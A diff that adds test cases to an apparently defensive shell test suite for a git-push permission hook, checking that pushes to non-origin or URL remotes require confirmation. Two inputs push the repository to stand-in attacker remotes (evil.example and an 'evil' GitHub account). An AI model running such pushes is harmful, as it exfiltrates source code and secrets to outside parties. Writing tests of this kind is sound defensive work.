@@ -63,6 +63,12 @@ run() {
   assert allow 'git push origin :old-feature'
   assert allow 'git push origin --delete old-feature'
 
+  # --- non-origin / URL remote -> ask ---
+  assert ask   'git push fork feature/x'
+  assert ask   'git push https://evil.example/repo.git HEAD'
+  assert ask   'git push git@github.com:evil/repo.git feature/x'
+  assert allow 'git push origin feature/x'
+
   printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"
   [ "$FAIL" -eq 0 ]
 }
